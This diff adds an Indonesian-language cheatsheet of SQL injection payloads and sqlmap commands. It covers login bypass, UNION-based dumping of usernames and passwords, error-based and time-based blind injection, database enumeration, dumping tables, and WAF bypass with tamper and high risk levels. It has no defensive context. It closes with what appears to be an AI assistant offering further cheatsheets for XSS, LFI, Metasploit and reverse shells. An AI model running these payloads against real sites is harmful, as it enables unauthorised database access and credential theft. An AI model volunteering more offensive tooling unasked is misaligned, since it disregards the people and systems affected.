@@ -1,0 +1,117 @@
+# SQL INJECTION & SQLMAP CHEATSHEET
+
+1. Dasar SQL Injection
+
+---
+
+Payload dasar testing:
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 --
+" OR 1=1 --
+admin' --
+admin' #
+admin'/\*
+
+Bypass login:
+' OR 'a'='a
+' OR 1=1 LIMIT 1 --
+' OR ''='
+
+2. Union-Based Injection
+
+---
+
+Cek jumlah kolom:
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+Contoh dump data:
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,@@version,database()--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table\_name,NULL,NULL FROM information\_schema.tables--
+' UNION SELECT column\_name,NULL,NULL FROM information\_schema.columns WHERE table\_name='users'--
+' UNION SELECT username,password,NULL FROM users--
+
+3. Error-Based Injection
+
+---
+
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
+
+4. Blind SQL Injection
+
+---
+
+Boolean-based:
+' AND 1=1--
+' AND 1=2--
+
+Time-based:
+' AND IF(1=1, SLEEP(5), 0)--
+' OR IF(substr(@@version,1,1)='5', SLEEP(5), 0)--
+
+5. Payload Penting
+
+---
+
+Cek database saat ini:
+SELECT database();
+
+Cek user database:
+SELECT user();
+
+List semua database:
+SELECT schema\_name FROM information\_schema.schemata;
+
+List tabel di database aktif:
+SELECT table\_name FROM information\_schema.tables WHERE table\_schema=database();
+
+List kolom pada tabel tertentu:
+SELECT column\_name FROM information\_schema.columns WHERE table\_name='users';
+
+6. SQLMap Cheatsheet
+
+---
+
+Scan dasar:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)"
+
+Dengan POST parameter:
+sqlmap -u "[http://target.com/page.php](http://target.com/page.php)" --data="id=1"
+
+List database:
+sqlmap -u "[http://target.com/?id=1](http://target.com/?id=1)" --dbs
+
+List tabel pada database tertentu:
+sqlmap -u "[http://target.com/?id=1](http://target.com/?id=1)" -D targetdb --tables
+
+Dump tabel:
+sqlmap -u "[http://target.com/?id=1](http://target.com/?id=1)" -D targetdb -T users --dump
+
+Dump kolom tertentu:
+sqlmap -u "[http://target.com/?id=1](http://target.com/?id=1)" -D targetdb -T users -C username,password --dump
+
+Bypass WAF / filter:
+sqlmap -u "[http://target.com/?id=1](http://target.com/?id=1)" --tamper=space2comment
+sqlmap -u "[http://target.com/?id=1](http://target.com/?id=1)" --level=5 --risk=3
+
+Run otomatis tanpa prompt:
+sqlmap -u "[http://target.com/?id=1](http://target.com/?id=1)" --batch
+
+7. Tips Penting
+
+---
+
+* Selalu cek respon aplikasi (error, delay, output).
+* Mulai dengan payload sederhana sebelum pakai SQLMap.
+* Gunakan information\_schema untuk enumerasi database.
+* Blind SQLi bisa dites dengan boolean-based atau time-based payload.
+
+---
+
+Apakah mau saya lanjutkan semua cheatsheet (XSS, LFI/Fuzz, Metasploit, Searchsploit, Reverse Shell) juga dalam format plain text seperti ini supaya konsisten untuk file txt-mu?
